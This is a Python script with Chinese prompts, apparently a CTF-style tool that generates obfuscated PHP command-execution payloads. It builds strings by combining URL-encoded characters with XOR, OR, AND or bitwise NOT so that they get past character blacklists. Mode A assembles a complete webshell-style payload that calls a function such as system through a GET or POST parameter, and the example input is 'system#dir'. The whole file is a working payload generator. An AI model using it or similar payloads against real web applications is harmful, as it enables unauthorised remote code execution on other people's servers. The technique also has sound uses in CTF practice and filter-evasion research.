import string
import argparse
import re
from urllib.parse import quote, quote_from_bytes, quote_plus, urlencode


a='''

   _____                _       __          __         
  / ____|              | |      \ \        / /         
 | |  __ _ __ ___  __ _| |_ _____\ \  /\  / /_ _ _ __  
 | | |_ | '__/ _ \/ _` | __|______\ \/  \/ / _` | '_ \ 
 | |__| | | |  __/ (_| | |_        \  /\  / (_| | | | |
  \_____|_|  \___|\__,_|\__|        \/  \/ \__,_|_| |_|
                                                       
                                                       
'''
print(a)
b='''
欢迎使用万大侠的小工具~
使用过程中遇到任何问题欢迎PR！

推荐使用'异或'和'与'操作方式，其余详情请翻阅使用手册README.md


'''
print(b)






def go(string_io=None):
    keys = list(range(65)) + list(range(91,97)) + list(range(123,127))
    black_list=[58,59,34,40,41,93]
    results = []
    numbers=dict()

    option=input('输入你的Payload格式；长格式为long、短格式为short、取反为not:')
    if pattern=='B':
        string_io=input('输入你要操作的字符串:')
    func=input('输入你要进行的操作；支持^、|、&、~:')
    if func=='^':
        for i in keys:
            for j in keys:
                if i not in black_list and j not in black_list:
                    asscii_number = i^j
                    if chr(asscii_number) in string.printable:
                        if(asscii_number==95):
                            numbers['Underscore']=numbers.get('Underscore',0)+1
                            temp = (f'{quote(chr(i))}^{quote(chr(j))}','Underscore')
                            results.append(temp)
                        else:
                            numbers[chr(asscii_number)]=numbers.get(chr(asscii_number),0)+1
                            temp = (f'{quote(chr(i))}^{quote(chr(j))}', chr(asscii_number))
                            results.append(temp)
        results.sort(key=lambda x:x[1], reverse=False)

    if func=='|':
        for i in keys:
            for j in keys:
                if i not in black_list and j not in black_list:
                    asscii_number = i|j
                    if chr(asscii_number) in string.printable :
                        if(asscii_number==95):
                            numbers['Underscore']=numbers.get('Underscore',0)+1
                            temp = (f'{quote(chr(i))}|{quote(chr(j))}','Underscore')
                            results.append(temp)
                        else:
                            numbers[chr(asscii_number)]=numbers.get(chr(asscii_number),0)+1
                            temp = (f'{quote(chr(i))}|{quote(chr(j))}', chr(asscii_number))
                            results.append(temp)
        results.sort(key=lambda x:x[1], reverse=False)

    if func=='&':
        for i in keys:
            for j in keys:
                if i not in black_list and j not in black_list:
                    asscii_number = i&j
                    if chr(asscii_number) in string.printable:
                        if(asscii_number==95):
                            numbers['Underscore']=numbers.get('Underscore',0)+1
                            temp = (f'{quote(chr(i))}&{quote(chr(j))}','Underscore')
                            results.append(temp)
                        else:
                            numbers[chr(asscii_number)]=numbers.get(chr(asscii_number),0)+1
                            temp = (f'{quote(chr(i))}&{quote(chr(j))}', chr(asscii_number))
                            results.append(temp)              
        results.sort(key=lambda x:x[1], reverse=False)

    final_str=''
    final_str_1=''
    final_str_2=''
    if(option=='short'):
        for s in string_io:
            if s == '_':
                s='Underscore'
            num=numbers.get(s,0)
            if num>0 :
                print(f'{s}一共有{num}种构造方法，请选择哪一个')
                cnum=int(input())
                flag=0
                for i in results:
                    if s == i[1]:
                        flag+=1
                        if cnum==flag:
                            temp=i[0].split(func)
                            if final_str=='':
                                final_str+=f'("{temp[0]}"{func}"{temp[1]}")'
                            else:
                                final_str+=f'.("{temp[0]}"{func}"{temp[1]}")'
            else:
                print('该字母的构造方法暂无，直接跳过')

    elif(option=='long'):
        for s in string_io:
            if s == '_':
                s='Underscore'
            num=numbers.get(s,0)
            if num>0 :
                print(f'{s}一共有{num}种构造方法，请选择哪一个')
                cnum=int(input())
                flag=0
                for i in results:
                    if s == i[1]:
                        flag+=1
                        if cnum==flag:
                            temp=i[0].split(f'{func}')
                            final_str_1+=temp[0]
                            final_str_2+=temp[1]                      
            else:
                print('该字母的构造方法暂无，直接跳过')
        final_str=f'("{final_str_1}"^"{final_str_2}")'

    elif(option=='not'):
        for s in string_io:
            final_str_1+=f'{quote(chr((ord(s)^0xff)))}'
        final_str_2=re.sub(r'%C2','',final_str_1)
        final_str+=f'(~{final_str_2})'
    return final_str


pattern=input('选择进行的模式；A生成完整的GET与POST命令与参数混淆，B仅对字符串进行混淆:      ')
if pattern=='B':
    print(go())

elif pattern=='A':
   t=input(r'请按序输入方法（_GET或者_POST）命令与参数，以#分界，默认密码为%ff；比如_GET#system#dir:          ')
   command=t.split('#')
   r1=''
   r2=command[1]
   r3=''
   r=''
   r1=go(command[0])
   r3=go(command[2])
   r=f'${{{r1}}}{{%ff}}({r3});&%ff={r2}'
   print(r)